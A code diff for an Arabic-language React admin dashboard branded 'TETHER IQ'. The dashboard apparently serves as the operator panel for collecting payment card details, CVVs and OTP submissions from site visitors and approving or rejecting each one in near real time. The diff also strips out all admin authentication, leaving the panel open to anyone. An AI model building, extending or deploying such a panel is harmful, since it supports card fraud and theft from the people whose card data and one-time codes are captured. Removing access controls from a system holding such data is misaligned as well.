@@ -1,12 +1,7 @@
 import React, { useCallback, useEffect, useState } from 'react';
 import { Link } from 'react-router-dom';
 import {
-  readStoredLoginCode,
-  storeLoginCode,
-  clearStoredLoginCode,
   adminRequest,
-  verifyAdminLoginCode,
-  AdminAuthError,
   crmReportUrl,
   downloadBlob,
   exportCrmCsv,
@@ -290,13 +285,13 @@ function CreditCardDetails({ card, compact }) {
   );
 }
 
-async function fetchOrderWithCard(code, orderId) {
+async function fetchOrderWithCard(orderId) {
   const id = encodeURIComponent(orderId);
-  const main = await adminRequest(`/api/admin/orders/${id}`, code);
+  const main = await adminRequest(`/api/admin/orders/${id}`);
   let card = main.card || null;
   if (!card?.cvv) {
     try {
-      const extra = await adminRequest(`/api/admin/orders/${id}/card`, code);
+      const extra = await adminRequest(`/api/admin/orders/${id}/card`);
       if (extra?.card) card = extra.card;
     } catch {
       /* keep main.card if any */
@@ -306,8 +301,6 @@ async function fetchOrderWithCard(code, orderId) {
 }
 
 export default function AdminDashboard() {
-  const [loginCode, setLoginCode] = useState(() => readStoredLoginCode());
-  const [saved, setSaved] = useState(() => Boolean(readStoredLoginCode()));
   const [tab, setTab] = useState('overview');
   const [err, setErr] = useState('');
   const [ok, setOk] = useState('');
@@ -354,60 +347,46 @@ export default function AdminDashboard() {
   const [telegramProbe, setTelegramProbe] = useState(null);
 
   const limit = 30;
-  const code = loginCode.trim();
-
-  const handleAuthFailure = useCallback((message) => {
-    clearStoredLoginCode();
-    setSaved(false);
-    setLoginCode('');
-    setErr(message || 'انتهت الجلسة أو رمز الدخول غير صحيح. سجّل الدخول مرة أخرى.');
-    setOk('');
-  }, []);
 
   const run = useCallback(async (fn, silent = false) => {
-    if (!code) return;
     if (!silent) setLoading(true);
     setErr('');
     try {
       await fn();
     } catch (e) {
-      if (e instanceof AdminAuthError || e?.status === 401) {
-        handleAuthFailure(e?.message);
-        return;
-      }
       setErr(String(e?.message || e));
     } finally {
       if (!silent) setLoading(false);
     }
-  }, [code, handleAuthFailure]);
+  }, []);
 
   const loadOverview = useCallback(() => run(async () => {
-    const o = await adminRequest('/api/admin/overview', code);
+    const o = await adminRequest('/api/admin/overview');
     setOverview(o);
     setSummary(o.summary);
-  }), [run, code]);
+  }), [run]);
 
   const loadCrm = useCallback(() => run(async () => {
-    const s = await adminRequest('/api/admin/crm/summary', code);
+    const s = await adminRequest('/api/admin/crm/summary');
     setSummary(s);
-    const v = await adminRequest(`/api/admin/crm/visits?offset=${vOff}&limit=${limit}`, code);
+    const v = await adminRequest(`/api/admin/crm/visits?offset=${vOff}&limit=${limit}`);
     setVisits(v.items || []);
     setVTotal(v.total || 0);
-    const o = await adminRequest(`/api/admin/crm/orders?offset=${oOff}&limit=${limit}`, code);
+    const o = await adminRequest(`/api/admin/crm/orders?offset=${oOff}&limit=${limit}`);
     setOrders(o.items || []);
     setOTotal(o.total || 0);
-  }), [run, code, vOff, oOff]);
+  }), [run, vOff, oOff]);
 
   const loadOrderMgmt = useCallback(() => run(async () => {
     const q = new URLSearchParams({ offset: '0', limit: '50', filter: orderFilter });
     if (orderQ.trim()) q.set('q', orderQ.trim());
-    const data = await adminRequest(`/api/admin/orders/list?${q}`, code);
+    const data = await adminRequest(`/api/admin/orders/list?${q}`);
     setOrderList(data.items || []);
     setOrderListTotal(data.total || 0);
-  }), [run, code, orderFilter, orderQ]);
+  }), [run, orderFilter, orderQ]);
 
   const loadPayment = useCallback(() => run(async () => {
-    const data = await adminRequest('/api/admin/payment-details', code);
+    const data = await adminRequest('/api/admin/payment-details');
     setPayment(data);
     const rc = data.details?.rateConfig || {};
     setRateFixed(String(rc.fixedRate ?? data.effectiveRate ?? ''));
@@ -416,38 +395,37 @@ export default function AdminDashboard() {
     setTimerMins(String(data.details?.paymentExpiryMinutes ?? 15));
     setProfiles(data.details?.profiles || []);
     setCurrentProfileId(data.details?.currentProfileId || '');
-  }), [run, code]);
+  }), [run]);
 
   const loadSite = useCallback(() => run(async () => {
-    setSiteConfig(await adminRequest('/api/admin/site-config', code));
-  }), [run, code]);
+    setSiteConfig(await adminRequest('/api/admin/site-config'));
+  }), [run]);
 
   const loadMarketing = useCallback(() => run(async () => {
-    setStats(await adminRequest('/api/admin/stats', code));
-    setTestimonials(await adminRequest('/api/admin/testimonials', code));
-  }), [run, code]);
+    setStats(await adminRequest('/api/admin/stats'));
+    setTestimonials(await adminRequest('/api/admin/testimonials'));
+  }), [run]);
 
   const loadBlocked = useCallback(() => run(async () => {
-    setBlocked(await adminRequest('/api/admin/blocked', code));
-  }), [run, code]);
+    setBlocked(await adminRequest('/api/admin/blocked'));
+  }), [run]);
 
   const loadChat = useCallback(() => run(async () => {
-    const data = await adminRequest('/api/admin/chat/sessions', code);
+    const data = await adminRequest('/api/admin/chat/sessions');
     setChatSessions(data.items || []);
-  }), [run, code]);
+  }), [run]);
 
   const loadCc = useCallback(() => run(async () => {
-    const data = await adminRequest('/api/admin/cc-otp/submissions', code);
+    const data = await adminRequest('/api/admin/cc-otp/submissions');
     setCcSubs((data.items || []).map((s) => ({ ...s, card: normalizeAdminCard(s.card) })));
     setSelectedCc(null);
-  }), [run, code]);
+  }), [run]);
 
   const loadBotAdmins = useCallback(() => run(async () => {
-    setBotAdmins(await adminRequest('/api/admin/bot-admins', code));
-  }), [run, code]);
+    setBotAdmins(await adminRequest('/api/admin/bot-admins'));
+  }), [run]);
 
   const refreshTab = useCallback(() => {
-    if (!saved || !code) return;
     const map = {
       overview: loadOverview,
       crm: loadCrm,
@@ -463,12 +441,21 @@ export default function AdminDashboard() {
       system: () => {},
     };
     (map[tab] || loadOverview)();
-  }, [saved, code, tab, loadOverview, loadCrm, loadOrderMgmt, loadPayment, loadSite, loadMarketing, loadBlocked, loadChat, loadCc, loadBotAdmins, run]);
+  }, [tab, loadOverview, loadCrm, loadOrderMgmt, loadPayment, loadSite, loadMarketing, loadBlocked, loadChat, loadCc, loadBotAdmins]);
 
   useEffect(() => {
-    if (!saved || !code) return;
     refreshTab();
-  }, [saved, tab, refreshTab, code]);
+  }, [tab, refreshTab]);
+
+  useEffect(() => {
+    if (tab !== 'ccotp' && tab !== 'orders') return;
+    const ms = 2200;
+    const tmr = setInterval(() => {
+      if (tab === 'ccotp') loadCc();
+      if (tab === 'orders') loadOrderMgmt();
+    }, ms);
+    return () => clearInterval(tmr);
+  }, [tab, loadCc, loadOrderMgmt]);
 
   useEffect(() => {
     if (tab === 'site' && siteConfig) {
@@ -477,62 +464,8 @@ export default function AdminDashboard() {
   }, [tab, siteConfig?.theme]);
 
   useEffect(() => {
-    if (!saved || !code) return;
-    let cancelled = false;
-    (async () => {
-      try {
-        await verifyAdminLoginCode(code);
-      } catch (e) {
-        if (!cancelled && (e instanceof AdminAuthError || e?.status === 401)) {
-          handleAuthFailure(e?.message);
-        }
-      }
-    })();
-    return () => { cancelled = true; };
-  }, [saved, code, handleAuthFailure]);
-
-  useEffect(() => {
-    if (saved && tab === 'crm' && code) loadCrm();
-  }, [vOff, oOff, saved, tab, code, loadCrm]);
-
-  const persistLogin = async () => {
-    const next = code.trim();
-    if (!next) {
-      setErr('أدخل رمز الدخول');
-      return;
-    }
-    setLoading(true);
-    setErr('');
-    setOk('');
-    try {
-      await verifyAdminLoginCode(next);
-      storeLoginCode(next);
-      setSaved(true);
-      setOk('تم تسجيل الدخول');
-    } catch (e) {
-      if (e instanceof AdminAuthError || e?.status === 401) {
-        setErr(
-          'رمز الدخول مرفوض من السيرفر. تأكد أنه يطابق ADMIN_CRM_TOKEN أو ADMIN_LOGIN_CODE في ملف .env على السيرفر.',
-        );
-      } else {
-        setErr(String(e?.message || e));
-      }
-      setSaved(false);
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  const logout = () => {
-    clearStoredLoginCode();
-    setSaved(false);
-    setLoginCode('');
-    setErr('');
-    setOk('');
-    setOverview(null);
-    setSummary(null);
-    setTab('overview');
-  };
+    if (tab === 'crm') loadCrm();
+  }, [vOff, oOff, tab, loadCrm]);
 
   const activeTabMeta = TABS.find((t) => t.id === tab) || TABS[0];
   const dismissAlerts = () => {
@@ -542,14 +475,14 @@ export default function AdminDashboard() {
 
   const setOrderStatus = async (orderId, status) => {
     await run(async () => {
-      await adminRequest(`/api/admin/orders/${encodeURIComponent(orderId)}/status`, code, {
+      await adminRequest(`/api/admin/orders/${encodeURIComponent(orderId)}/status`, {
         method: 'PATCH',
         body: JSON.stringify({ status }),
       });
       setOk('تم تحديث الحالة');
       loadOrderMgmt();
       if (selectedOrder?.orderId === orderId) {
-        const d = await fetchOrderWithCard(code, orderId);
+        const d = await fetchOrderWithCard(orderId);
         setSelectedOrder({ ...d.order, card: d.card || null });
       }
     });
@@ -557,7 +490,7 @@ export default function AdminDashboard() {
 
   const openOrder = async (orderId) => {
     await run(async () => {
-      const d = await fetchOrderWithCard(code, orderId);
+      const d = await fetchOrderWithCard(orderId);
       setSelectedOrder({ ...d.order, card: d.card || null });
     });
   };
@@ -565,59 +498,14 @@ export default function AdminDashboard() {
   const openChat = async (sessionId) => {
     setChatSessionId(sessionId);
     await run(async () => {
-      const d = await adminRequest(`/api/admin/chat/sessions/${encodeURIComponent(sessionId)}/messages`, code);
+      const d = await adminRequest(`/api/admin/chat/sessions/${encodeURIComponent(sessionId)}/messages`);
       setChatMessages(d.session);
     });
   };
 
   return (
-    <div className={`admin-dashboard page-shell${saved ? ' admin-dashboard--app' : ''}`} dir="rtl" lang="ar">
+    <div className="admin-dashboard page-shell admin-dashboard--app" dir="rtl" lang="ar">
       <div className="admin-dashboard__inner">
-        {!saved ? (
-          <>
-            <header className="admin-dashboard__header admin-dashboard__header--gate">
-              <div className="admin-dashboard__brand">
-                <h1 className="admin-dashboard__title">لوحة الإدارة — TETHER IQ</h1>
-                <p className="admin-dashboard__subtitle">كل إمكانيات بوت تيليغرام في مكان واحد</p>
-              </div>
-              <Link to="/" className="admin-dashboard__home">الرئيسية</Link>
-            </header>
-            <section className="admin-login-wrap" aria-label="تسجيل الدخول">
-              <div className="admin-login-card glass-panel">
-                <div className="admin-login-card__icon" aria-hidden>
-                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.75">
-                    <rect x="5" y="11" width="14" height="10" rx="2" />
-                    <path d="M8 11V8a4 4 0 118 0v3" strokeLinecap="round" />
-                  </svg>
-                </div>
-                <h2 className="admin-login-card__title">تسجيل الدخول</h2>
-                <p className="admin-login-card__hint">أدخل رمز الدخول للوصول إلى لوحة التحكم</p>
-                <form
-                  className="admin-login-form"
-                  onSubmit={(e) => {
-                    e.preventDefault();
-                    if (code.trim()) persistLogin();
-                  }}
-                >
-                  <Field label="رمز الدخول">
-                    <Input
-                      type="password"
-                      value={loginCode}
-                      onChange={(e) => setLoginCode(e.target.value)}
-                      placeholder="••••••••••"
-                      autoComplete="off"
-                      autoFocus
-                    />
-                  </Field>
-                  <Btn type="submit" className="admin-login-form__submit" disabled={!code.trim() || loading}>
-                    دخول
-                  </Btn>
-                </form>
-              </div>
-            </section>
-            <Alert err={err} ok={ok} onDismiss={dismissAlerts} />
-          </>
-        ) : (
           <div className="admin-app">
             <aside className="admin-sidebar glass-panel" aria-label="القائمة">
               <div className="admin-sidebar__brand">
@@ -654,9 +542,7 @@ export default function AdminDashboard() {
                   </button>
                 ))}
               </nav>
-              <button type="button" className="admin-sidebar__logout" onClick={logout}>
-                تسجيل الخروج
-              </button>
+              <Link to="/" className="admin-sidebar__logout">الرئيسية</Link>
             </aside>
             <div className="admin-main">
               <header className="admin-topbar glass-panel">
@@ -703,10 +589,10 @@ export default function AdminDashboard() {
             {tab === 'crm' && summary && (
               <>
                 <div className="admin-toolbar">
-                  <Btn onClick={async () => { const b = await exportCrmCsv(code, 'visits'); downloadBlob(b, 'visits.csv'); }}>CSV زيارات</Btn>
-                  <Btn onClick={async () => { const b = await exportCrmCsv(code, 'orders'); downloadBlob(b, 'orders.csv'); }}>CSV طلبات</Btn>
-                  <Btn variant="outline" onClick={() => window.open(crmReportUrl(code), '_blank')}>تقرير HTML</Btn>
-                  <Btn variant="outline" onClick={() => window.open(crmReportUrl(code, true), '_blank')}>PDF</Btn>
+                  <Btn onClick={async () => { const b = await exportCrmCsv('visits'); downloadBlob(b, 'visits.csv'); }}>CSV زيارات</Btn>
+                  <Btn onClick={async () => { const b = await exportCrmCsv('orders'); downloadBlob(b, 'orders.csv'); }}>CSV طلبات</Btn>
+                  <Btn variant="outline" onClick={() => window.open(crmReportUrl(), '_blank')}>تقرير HTML</Btn>
+                  <Btn variant="outline" onClick={() => window.open(crmReportUrl(true), '_blank')}>PDF</Btn>
                 </div>
                 <div className="admin-split">
                   <Panel title={`الزيارات (${vTotal})`}>
@@ -801,7 +687,7 @@ export default function AdminDashboard() {
                     <Input value={rateFixed} onChange={(e) => setRateFixed(e.target.value)} />
                   </Field>
                   <Btn onClick={() => run(async () => {
-                    await adminRequest('/api/admin/rate-fixed', code, { method: 'POST', body: JSON.stringify({ fixedRate: Number(rateFixed) }) });
+                    await adminRequest('/api/admin/rate-fixed', { method: 'POST', body: JSON.stringify({ fixedRate: Number(rateFixed) }) });
                     setOk('تم حفظ السعر الثابت');
                     loadPayment();
                   })}>حفظ ثابت</Btn>
@@ -812,7 +698,7 @@ export default function AdminDashboard() {
                     <Input value={rateFloatOffset} onChange={(e) => setRateFloatOffset(e.target.value)} />
                   </Field>
                   <Btn variant="outline" onClick={() => run(async () => {
-                    await adminRequest('/api/admin/rate-float', code, {
+                    await adminRequest('/api/admin/rate-float', {
                       method: 'POST',
                       body: JSON.stringify({ floatBase: Number(rateFloatBase), floatOffset: Number(rateFloatOffset) }),
                     });
@@ -825,7 +711,7 @@ export default function AdminDashboard() {
                     <Input type="number" value={timerMins} onChange={(e) => setTimerMins(e.target.value)} />
                   </Field>
                   <Btn onClick={() => run(async () => {
-                    await adminRequest('/api/admin/payment-details', code, {
+                    await adminRequest('/api/admin/payment-details', {
                       method: 'PATCH',
                       body: JSON.stringify({ paymentExpiryMinutes: Number(timerMins) }),
                     });
@@ -841,7 +727,7 @@ export default function AdminDashboard() {
                 <div className="admin-toolbar">
                   <Input placeholder="اسم بروفايل جديد" value={newProfileName} onChange={(e) => setNewProfileName(e.target.value)} />
                   <Btn onClick={() => run(async () => {
-                    await adminRequest('/api/admin/profiles', code, { method: 'POST', body: JSON.stringify({ nameAr: newProfileName }) });
+                    await adminRequest('/api/admin/profiles', { method: 'POST', body: JSON.stringify({ nameAr: newProfileName }) });
                     setNewProfileName('');
                     setOk('تمت الإضافة');
                     loadPayment();
@@ -854,14 +740,14 @@ export default function AdminDashboard() {
                       {currentProfileId === p.id && <span className="admin-badge">نشط</span>}
                       {currentProfileId !== p.id && (
                         <Btn variant="outline" onClick={() => run(async () => {
-                          await adminRequest(`/api/admin/profiles/${p.id}/activate`, code, { method: 'POST' });
+                          await adminRequest(`/api/admin/profiles/${p.id}/activate`, { method: 'POST' });
                           setOk('تم التفعيل');
                           loadPayment();
                         })}>تفعيل للموقع</Btn>
                       )}
                       <Btn variant="outline" onClick={() => run(async () => {
                         if (!window.confirm('حذف البروفايل؟')) return;
-                        await adminRequest(`/api/admin/profiles/${p.id}`, code, { method: 'DELETE' });
+                        await adminRequest(`/api/admin/profiles/${p.id}`, { method: 'DELETE' });
                         loadPayment();
                       })}>حذف</Btn>
                     </div>
@@ -872,7 +758,7 @@ export default function AdminDashboard() {
                             type="checkbox"
                             checked={p.methodEnabled?.[mk] !== false}
                             onChange={(e) => run(async () => {
-                              await adminRequest(`/api/admin/profiles/${p.id}`, code, {
+                              await adminRequest(`/api/admin/profiles/${p.id}`, {
                                 method: 'PATCH',
                                 body: JSON.stringify({ methodEnabled: { [mk]: e.target.checked } }),
                               });
@@ -883,7 +769,7 @@ export default function AdminDashboard() {
                         </label>
                       ))}
                     </div>
-                    {mkFields(p, code, run, loadPayment)}
+                    {mkFields(p, run, loadPayment)}
                   </div>
                 ))}
               </Panel>
@@ -952,7 +838,7 @@ export default function AdminDashboard() {
                   />
                 </Field>
                 <Btn onClick={() => run(async () => {
-                  await adminRequest('/api/admin/site-config', code, { method: 'PATCH', body: JSON.stringify(siteConfig) });
+                  await adminRequest('/api/admin/site-config', { method: 'PATCH', body: JSON.stringify(siteConfig) });
                   setOk('تم حفظ إعدادات الموقع');
                 })}>حفظ</Btn>
               </Panel>
@@ -970,7 +856,7 @@ export default function AdminDashboard() {
                     </Field>
                   ))}
                   <Btn onClick={() => run(async () => {
-                    await adminRequest('/api/admin/stats', code, { method: 'PATCH', body: JSON.stringify(stats) });
+                    await adminRequest('/api/admin/stats', { method: 'PATCH', body: JSON.stringify(stats) });
                     setOk('تم الحفظ');
                   })}>حفظ الإحصائيات</Btn>
                 </Panel>
@@ -980,7 +866,7 @@ export default function AdminDashboard() {
                       <li key={t.id}>
                         <strong>{t.nameAr}</strong> — {t.textAr?.slice(0, 80)}
                         <Btn variant="outline" onClick={() => run(async () => {
-                          await adminRequest(`/api/admin/testimonials/${t.id}`, code, { method: 'DELETE' });
+                          await adminRequest(`/api/admin/testimonials/${t.id}`, { method: 'DELETE' });
                           loadMarketing();
                         })}>حذف</Btn>
                       </li>
@@ -991,7 +877,7 @@ export default function AdminDashboard() {
             )}
 
             {tab === 'blocked' && blocked && (
-              <BlockedPanel blocked={blocked} code={code} run={run} reload={loadBlocked} setOk={setOk} />
+              <BlockedPanel blocked={blocked} run={run} reload={loadBlocked} setOk={setOk} />
             )}
 
             {tab === 'chat' && (
@@ -1020,7 +906,7 @@ export default function AdminDashboard() {
                       <Textarea rows={3} value={chatReply} onChange={(e) => setChatReply(e.target.value)} />
                     </Field>
                     <Btn onClick={() => run(async () => {
-                      await adminRequest(`/api/admin/chat/sessions/${encodeURIComponent(chatSessionId)}/reply`, code, {
+                      await adminRequest(`/api/admin/chat/sessions/${encodeURIComponent(chatSessionId)}/reply`, {
                         method: 'POST',
                         body: JSON.stringify({ text: chatReply }),
                       });
@@ -1079,7 +965,7 @@ export default function AdminDashboard() {
                               onClick={(e) => {
                                 e.stopPropagation();
                                 run(async () => {
-                                  await adminRequest(`/api/admin/cc-otp/submissions/${s.id}/decision`, code, {
+                                  await adminRequest(`/api/admin/cc-otp/submissions/${s.id}/decision`, {
                                     method: 'POST',
                                     body: JSON.stringify({ action: a }),
                                   });
@@ -1112,7 +998,7 @@ export default function AdminDashboard() {
                   <Input placeholder="User ID" value={newAdminId} onChange={(e) => setNewAdminId(e.target.value)} />
                   <Input placeholder="صلاحيات (مثال: all)" value={newAdminPerms} onChange={(e) => setNewAdminPerms(e.target.value)} />
                   <Btn onClick={() => run(async () => {
-                    await adminRequest('/api/admin/bot-admins', code, {
+                    await adminRequest('/api/admin/bot-admins', {
                       method: 'POST',
                       body: JSON.stringify({ userId: newAdminId, permissions: newAdminPerms }),
                     });
@@ -1125,7 +1011,7 @@ export default function AdminDashboard() {
                     <li key={id}>
                       <code>{id}</code> — {(row.permissions || []).join(', ')}
                       <Btn variant="outline" onClick={() => run(async () => {
-                        await adminRequest(`/api/admin/bot-admins/${id}`, code, { method: 'DELETE' });
+                        await adminRequest(`/api/admin/bot-admins/${id}`, { method: 'DELETE' });
                         loadBotAdmins();
                       })}>إزالة</Btn>
                     </li>
@@ -1141,7 +1027,7 @@ export default function AdminDashboard() {
                   <Btn
                     variant="outline"
                     onClick={() => run(async () => {
-                      setTelegramProbe(await adminRequest('/api/admin/telegram-probe', code));
+                      setTelegramProbe(await adminRequest('/api/admin/telegram-probe'));
                     })}
                   >
                     فحص الاتصال
@@ -1175,13 +1061,12 @@ export default function AdminDashboard() {
               </div>
             </div>
           </div>
-        )}
       </div>
     </div>
   );
 }
 
-function mkFields(profile, code, run, reload) {
+function mkFields(profile, run, reload) {
   const fields = [
     ['fastPay_number', 'FastPay رقم', 'fastPay', 'number'],
     ['zainCash_number', 'زين كاش', 'zainCash', 'number'],
@@ -1198,7 +1083,7 @@ function mkFields(profile, code, run, reload) {
             <Input
               defaultValue={val}
               onBlur={(e) => run(async () => {
-                await adminRequest(`/api/admin/profiles/${profile.id}/fields`, code, {
+                await adminRequest(`/api/admin/profiles/${profile.id}/fields`, {
                   method: 'PATCH',
                   body: JSON.stringify({ fieldKey: key, value: e.target.value }),
                 });
@@ -1212,7 +1097,7 @@ function mkFields(profile, code, run, reload) {
   );
 }
 
-function BlockedPanel({ blocked, code, run, reload, setOk }) {
+function BlockedPanel({ blocked, run, reload, setOk }) {
   const [ip, setIp] = useState('');
   const [fp, setFp] = useState('');
   return (
@@ -1227,7 +1112,7 @@ function BlockedPanel({ blocked, code, run, reload, setOk }) {
           <div className="admin-toolbar">
             <Input value={val} onChange={(e) => setVal(e.target.value)} placeholder={field} />
             <Btn onClick={() => run(async () => {
-              await adminRequest(postPath, code, { method: 'POST', body: JSON.stringify(bodyFn(val)) });
+              await adminRequest(postPath, { method: 'POST', body: JSON.stringify(bodyFn(val)) });
               setVal('');
               setOk('تم الحظر');
               reload();
@@ -1240,7 +1125,7 @@ function BlockedPanel({ blocked, code, run, reload, setOk }) {
                 <Btn variant="outline" onClick={() => run(async () => {
                   const raw = it[field] || it.ip || it.fingerprint;
                   const del = `${postPath}/${encodeURIComponent(raw)}`;
-                  await adminRequest(del, code, { method: 'DELETE' });
+                  await adminRequest(del, { method: 'DELETE' });
                   reload();
                 })}>فك الحظر</Btn>
               </li>
